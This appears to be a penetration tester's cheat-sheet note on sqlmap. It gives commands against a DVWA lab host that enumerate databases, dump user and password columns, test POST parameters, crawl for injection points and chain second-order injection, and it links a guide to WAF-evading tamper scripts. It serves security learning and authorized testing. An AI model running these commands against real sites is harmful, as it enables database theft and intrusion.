---
Description: Tools used to automate the process of finding SQL injection vulnerabilities
URL: https://sqlmap.org/
---

![](../../zzz_res/attachments/sqlmap.png)

### Enumerating the DBMS

```bash
$ sqlmap -u "http://victim/vuln/vulnerabilities/sql_bind/?id=1&Submit=Submit" --cookie="[valore_cookie]" --dbs
```

### Dumping Tables, Columns and Data

```bash
$ sqlmap -u "http://victim/vuln/vulnerabilities/sql_bind/?id=1&Submit=Submit" --cookie="[valore_cookie]" -D dvwa --tables
$ sqlmap -u "http://victim/vuln/vulnerabilities/sql_bind/?id=1&Submit=Submit" --cookie="[valore_cookie]" -D dvwa  -T users --columns
$ sqlmap -u "http://victim/vuln/vulnerabilities/sql_bind/?id=1&Submit=Submit" --cookie="[valore_cookie]" -D dvwa  -T users -C user,password --dump
```

### Testing POST parameters

```bash
$ sqlmap -u "http://victim/vuln/vulnerabilities/sql_bind/" --data="id=1&Submit=Submit" --cookie="[valore_cookie]" -D dvwa  -T users --columns
```

### Automatic crawl and SQLi test

```bash
$ sqlmap -u "http://victim/.it" --crawl=1 --batch --threads=5
```

### Testing 2nd order SQL Injection

Save both injection and oracle HTTP requests and run:  

```bash
$ sqlmap -r injection.req --second-req=oracle.req --batch
```

### Custom tamper scripts

Creating your own tamper script for SQLMap involves writing a Python script that modifies the payloads used by SQLMap to evade web application firewalls (WAFs) or other filtering mechanisms. [Here](https://nav1n0x.gitbook.io/advanced-sql-injection-techniques#creating-your-own-tamper-script) is a step-by-step guide to create a custom tamper script. [^sqlmap-custom-tamper]

[^sqlmap-custom-tamper]: [🚨Advanced SQL Injection Techniques by Nav1n0x](../../Readwise/Articles/gitbook.io%20-%20🚨Advanced%20SQL%20Injection%20Techniques%20by%20Nav1n0x.md)